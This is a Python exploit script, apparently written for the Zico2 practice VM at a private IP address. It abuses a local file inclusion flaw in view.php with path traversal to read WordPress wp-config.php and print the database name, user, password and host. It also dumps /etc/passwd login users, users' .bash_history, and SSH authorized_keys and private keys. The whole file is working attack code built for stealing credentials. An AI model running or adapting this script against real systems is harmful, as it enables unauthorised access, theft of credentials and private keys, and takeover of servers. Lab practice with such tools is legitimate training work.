#!/usr/bin/env python3
"""zico2 - Full recon via LFI"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'

# Read WordPress wp-config from common locations
# Web root is /var/www/, view.php is in /var/www/
print('=== Scanning for wp-config.php ===')
wp_paths = [
    '../../../var/www/wordpress/wp-config.php',
    '../../../var/www/wp-config.php',
    '../wp-config.php',
    '../../wp-config.php',
    '../../../var/www/html/wordpress/wp-config.php',
    '../../../var/www/html/wp-config.php',
]
for p in wp_paths:
    r = s.get(f'{BASE}/view.php?page={p}', timeout=10)
    if len(r.text) > 50 and 'Hacking' not in r.text:
        clean = re.sub(r'<[^>]+>', '', r.text).strip()
        if 'DB_' in clean or 'mysql' in clean.lower() or '<?php' in clean:
            print(f'  [+] {p}: FOUND!')
            db_user = re.search(r"DB_USER.*?['\"]([^'\"]+)", clean)
            db_pass = re.search(r"DB_PASSWORD.*?['\"]([^'\"]+)", clean)
            db_name = re.search(r"DB_NAME.*?['\"]([^'\"]+)", clean)
            db_host = re.search(r"DB_HOST.*?['\"]([^'\"]+)", clean)
            if db_name: print(f'    DB_NAME: {db_name.group(1)}')
            if db_user: print(f'    DB_USER: {db_user.group(1)}')
            if db_pass: print(f'    DB_PASS: {db_pass.group(1)}')
            if db_host: print(f'    DB_HOST: {db_host.group(1)}')
            break
    elif len(r.text) > 0:
        print(f'  [-] {p}: {len(r.text)}B (not wp-config)')

# Read /etc/passwd to see all users
print('\n=== /etc/passwd users ===')
r = s.get(f'{BASE}/view.php?page=../../../etc/passwd', timeout=10)
if 'root:' in r.text:
    for line in r.text.strip().split('\n'):
        parts = line.split(':')
        if len(parts) >= 7:
            user = parts[0]
            shell = parts[6]
            home = parts[5]
            if shell not in ['/bin/false', '/usr/sbin/nologin', '/bin/nologin']:
                print(f'  {user}: home={home} shell={shell}')

# Read /home/ structure
print('\n=== /home/ directories ===')
for user in ['zico', 'root']:
    r = s.get(f'{BASE}/view.php?page=../../../home/{user}/.bash_history', timeout=10)
    if len(r.text) > 50 and 'Hacking' not in r.text:
        clean = re.sub(r'<[^>]+>', '', r.text).strip()
        print(f'  {user} bash_history ({len(clean)}B):')
        for line in clean.split('\n')[:10]:
            if line.strip():
                print(f'    {line.strip()[:150]}')

# Read zico's SSH keys
print('\n=== SSH keys ===')
ssh_paths = [
    '../../../home/zico/.ssh/authorized_keys',
    '../../../home/zico/.ssh/id_rsa',
    '../../../root/.ssh/authorized_keys',
]
for p in ssh_paths:
    r = s.get(f'{BASE}/view.php?page={p}', timeout=10)
    if len(r.text) > 20 and 'Hacking' not in r.text:
        clean = re.sub(r'<[^>]+>', '', r.text).strip()
        print(f'  [+] {p}:')
        print(f'      {clean[:300]}')
